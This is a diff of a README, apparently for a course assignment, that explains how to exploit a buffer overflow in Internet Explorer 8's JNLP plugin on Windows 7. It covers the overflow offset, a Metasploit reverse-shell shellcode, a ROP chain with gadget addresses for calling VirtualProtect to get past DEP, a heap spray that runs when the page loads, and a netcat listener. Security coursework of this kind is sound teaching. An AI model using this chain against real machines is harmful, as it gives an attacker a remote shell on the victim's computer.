@@ -1,4 +1,4 @@
-# Exploiting a Buffer Overflow Vulnerability in the JNLP plugin within Internet Explorer 8 with using the Heap Spraying Technique in a DEP-Enabled (Data Execution Prevention) Windows 7 machine
+# Exploiting a Buffer Overflow Vulnerability in the JNLP plugin within Internet Explorer 8 with using the Heap Spraying Technique in a DEP-Enabled (Data Execution Prevention) Windows 7 Machine
 
 JNLP (Java Network Launch Protocol) enables an application to be launched on a client desktop using resources that are hosted on a remote server. A specific version of JNLP for IE8 is vulnerable to a stack-based buffer overflow: when the plugin is invoked with a **launchjnlp** parameter, it will copy the value of the **docbase** parameter to a stack buffer using `sprintf`, but fails to check the length of the value. 
 
@@ -17,7 +17,7 @@ Input a sufficiently long string in the **docbase** value such that we have cont
 ## How it's done
 To demonstrate this vulnerability, a simple web server is set up to listen on port 8080. This web server shows the contents of a specific directory in which the html file (containing the exploit) is located. The html file is clicked from the client and nothing appears to happen, but the truth is that the heap is sprayed with a shellcode! This shellcode's goal is to establish a reversed TCP connection to a chosen IP and port. The port used is *6666*, and to simplifly the assignment's grading, the chosen IP is 127.0.0.1, which means that the command prompt is obtained in the client instead of in the attacker's machine (Ubuntu Linux, in this case).
 
-Ideally, when the victim clicks on  *Click Me*, the shellcode should be executed. However, the big obstacle preventing this is called DEP. DEP is a system-level memory protection feature that is built into the operating system; it marks memory regions as non-executable, and therefore, it prevents the execution of code from data pages such as the heap, stacks, and memory pools.
+Ideally, when the victim clicks on  **Click Me**, the shellcode should be executed. However, the big obstacle preventing this is called DEP. DEP is a system-level memory protection feature that is built into the operating system; it marks memory regions as non-executable, and therefore, it prevents the execution of code from data pages such as the heap, stacks, and memory pools.
 
 To go around this, we are going to call Virtual Protect. VirtualProtect is a kernel32.dll function that can be used to change the execution permissions of a page. We can specify the pointer to the memory address that we want to mark as executable. To be able to call it, we need to use the principles of Return Oriented Programming (or ROP). Since there is a buffer overflow vulnerability in the JNLP invocation, we can set/overwrite whatever values we want on $ebp and $eip, thus, controling the execution of the program with the goal of calling VirtualProtect.
 
@@ -25,7 +25,7 @@ To go around this, we are going to call Virtual Protect. VirtualProtect is a ker
 ## Specific Steps
 0. Two machines are used to demonstrate this vulnerability. A Windows 7 VM acts as the client, and an Ubuntu Linux VM acts as the web server.
 
-1. Test different length inputs for **docbase** to determine the number of bytes needed to override $$ebp and eip. In this case, 388 bytes is the maximum amount of bytes that can be placed on the buffer before starting to overwrite $ebp and $eip. 
+1. Test different length inputs for **docbase** to determine the number of bytes needed to override $ebp and $eip. In this case, 388 bytes is the maximum amount of bytes that can be placed on the buffer before starting to overwrite $ebp and $eip. 
 
 2. A Windows shellcode is generated with Metasploit, which is a tool already installed in Kali Linux. The instructions in this shellcode create a reverse TCP connection from said Windows machine to a chosen IP and port. In other words, these instructions would spawn the victim's command prompt in the attacker's machine; but for practicality, the IP chosen as the attacker's IP does not belong to the attacker and it is the victim's machine, 127.0.0.1. Using the attacker's IP would make the demo realistic, but it would not make it easy to the grader of this assignment.
 
@@ -48,20 +48,25 @@ To determine which libraries are not compatible with ASLR, I ran `!load narly` a
 
 *Note that the shellcode address used in this block can only be determined after step #5 and #6. I was using 0x41414141 for testing purposes until I found a realiable address for my shellcode.*
 ```
-%u4242%u4242 Any bytes						  (0x42424242) *
+%u4242%u4242 Any bytes                        (0x42424242) *
 %u4cc1%u7c34 pop eax; ret                     (0x7C344cc1)
 %ua158%u7c37 Virtual Protect Stub             (0x7C37A158)
 %u64bf%u7c35 call dword ptr [eax-18h] ; ret   (0x7C3564BF)
 %u2208%u0808 parameter 1: Shellcode Address   (0x08082208)
 %u4000%u0000 parameter 2: Size of region      (0x00004000)
 %u0040%u0000 parameter 3: Protection Bits RWX (0x00000040)
-%u0a0a%u0a0a parameter 4: Old protection value(0x0a0a0a0a) [Any writable]
+%u0a0a%u0a0a parameter 4: Old protection value(0x0a0a0a0a) [Or any writable]
 %u2208%u0808 Shellcode Address                (0x08082208) **
-	* Due to the Standard calling convention, after “ret,” ESP register does not directly point to the next word of Saved EIP.
-The callee function cleans local variable; thus ESP will point to right after the function parameters on the stack. Which is why we can use any bytes as the beggining of the ROP chain.
-	** Return from previos gadget (as its page is executable, shellcode will proceed to run)
+
+* Due to the Standard calling convention, after “ret,” ESP register does not directly 
+point to the next word of Saved EIP.
+The callee function cleans local variable; thus ESP will point to right after the function 
+parameters on the stack. Which is why we can use any bytes as the beggining of the ROP chain.
+
+** Return from previos gadget (as its page is executable, shellcode will proceed to run)
 ```
 
+The final ROP chain looks as follows:
 ```%u4242%u4242%u4cc1%u7c34%ua158%u7c37%u64bf%u7c35%u2208%u0808%u0040%u0000%u4000%u0000%u0a0a%u0a0a%u2208%u0808```
 
 Now, the problem with these ROP chain is that it contains null bytes and the program crashes when it is running the gadgets.
@@ -144,10 +149,11 @@ As follows:
 </html>
 ```
 
-This means that as soon as the victim clicks on the page (jnlp1.html), the heap should be sprayed because of `<body onload="heap_spray">`
+This means that as soon as the victim clicks on the page (jnlp1.html), the heap should be sprayed because of `<body onload="heap_spray">`.
 
+So when **Click Me** is clicked, **trigger()** will begin the execution of the exploit.
 
-7. To accept this reverse TCP connection in Windows, the following netcat command is needed:
+7. And to accept this reverse TCP connection in Windows (and confirm that the exploit was successful), the following netcat command is needed:
 
 `nc -l -p 6666`
 
